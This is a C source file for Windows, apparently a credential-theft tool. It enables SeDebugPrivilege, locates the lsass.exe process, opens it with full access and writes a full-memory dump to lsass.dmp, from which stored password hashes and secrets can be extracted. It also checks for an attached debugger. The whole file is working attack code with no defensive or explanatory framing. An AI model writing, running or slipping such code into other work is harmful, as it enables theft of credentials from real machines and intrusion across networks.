#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <DbgHelp.h>

#pragma comment(lib, "DbgHelp.lib")


BOOL IsDebuggerPresentCheck(VOID);
BOOL SetPrivileges(VOID);
DWORD GetLsassPID(VOID);


INT main(VOID)
{
	IsDebuggerPresentCheck();
	SetPrivileges();

	DWORD lsassID = GetLsassPID();
	if (lsassID == 0)
	{
		printf("Could not find lsass.exe.");
		return 1;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassID);
	if (hProcess == NULL)
	{
		printf("Failed to get process");
		return 1;
	}

	HANDLE hDump = CreateFile(L"lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDump == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create dump file.");
		return 1;
	}

	BOOL lsassDump = MiniDumpWriteDump(hProcess, lsassID, hDump, MiniDumpWithFullMemory, NULL, NULL, NULL);
	lsassDump ? printf("Dumped lsass to lsass.dmp") : printf("Failed to dump lsass");
	return (lsassDump ? ERROR_SUCCESS : 1);
}



BOOL IsDebuggerPresentCheck(VOID)
{
	if (IsDebuggerPresent())
	{
		printf("Debugger detected\n");
		return TRUE;
	}
	printf("No debugger detected\n");
	return FALSE;
}


BOOL SetPrivileges(VOID)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES privs;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		printf("Could not get process token\n");
		CloseHandle(hToken);
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &privs.Privileges[0].Luid))
	{
		printf("Could not find SeDebugPrivilege");
		CloseHandle(hToken);
		return FALSE;
	}

	privs.PrivilegeCount = 1;
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &privs, 0, NULL, NULL))
	{
		printf("Failed to elevate token privileges");
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


DWORD GetLsassPID(VOID)
{
	DWORD processID = 0;
	HANDLE hProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 p32;
	p32.dwSize = sizeof(PROCESSENTRY32);

	if (hProcesses != INVALID_HANDLE_VALUE && Process32First(hProcesses, &p32))
	{
		do {
			if (wcscmp(p32.szExeFile, L"lsass.exe") == 0)
			{
				processID = p32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcesses, &p32));
		printf("LSASS pid = %lu\n", processID);
	}

	CloseHandle(hProcesses);
	return processID;
}
